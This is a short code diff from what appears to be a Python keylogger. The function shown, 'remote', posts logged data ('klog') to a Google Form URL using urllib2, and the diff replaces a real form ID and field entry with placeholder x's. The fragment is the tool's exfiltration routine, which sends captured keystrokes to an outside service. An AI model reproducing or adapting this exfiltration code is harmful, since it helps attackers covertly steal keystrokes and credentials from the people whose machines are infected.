@@ -25,8 +25,8 @@ def msg():
 #Remote Google Form logs post
 def remote():
     global data
-    url="https://docs.google.com/forms/d/1IqfjoKPtdUfISndUuqhXgbLojcv8yBp42bvrxPdAdHM/formResponse" #Specify Google Form URL here
-    klog={'entry.1861467089':data} #Specify the Field Name here
+    url="https://docs.google.com/forms/d/xxxxxxxxxxxxxxxxxxxxxxxx/formResponse" #Specify Google Form URL here
+    klog={'entry.xxxxxxxxx':data} #Specify the Field Name here
     try:
         dataenc=urllib.urlencode(klog)
         req=urllib2.Request(url,dataenc)
